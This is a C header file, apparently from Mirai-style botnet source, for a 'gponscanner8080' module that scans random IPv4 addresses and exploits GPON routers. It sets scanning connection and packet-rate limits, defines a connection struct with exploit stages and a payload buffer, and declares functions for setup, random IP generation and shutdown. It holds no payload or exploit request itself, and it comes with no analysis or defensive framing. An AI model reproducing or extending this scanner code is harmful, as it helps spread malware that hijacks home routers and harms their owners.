#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define gponscanner8080_SCANNER_MAX_CONNS 512
#define gponscanner8080_SCANNER_RAW_PPS 720
#else
#define gponscanner8080_SCANNER_MAX_CONNS 128
#define gponscanner8080_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define gponscanner8080_SCANNER_RDBUF_SIZE 1024
#define gponscanner8080_SCANNER_HACK_DRAIN 64
#else
#define gponscanner8080_SCANNER_RDBUF_SIZE 256
#define gponscanner8080_SCANNER_HACK_DRAIN 64
#endif

struct gponscanner8080_scanner_connection
{
    int fd, last_recv;
    enum
    {
        gponscanner8080_SC_CLOSED,
        gponscanner8080_SC_CONNECTING,
        gponscanner8080_SC_EXPLOIT_STAGE2,
        gponscanner8080_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[gponscanner8080_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void gponscanner8080_scanner_init();
void gponscanner8080_scanner_kill(void);

static void gponscanner8080_setup_connection(struct gponscanner8080_scanner_connection *);
static ipv4_t gponscanner8080_get_random_ip(void);
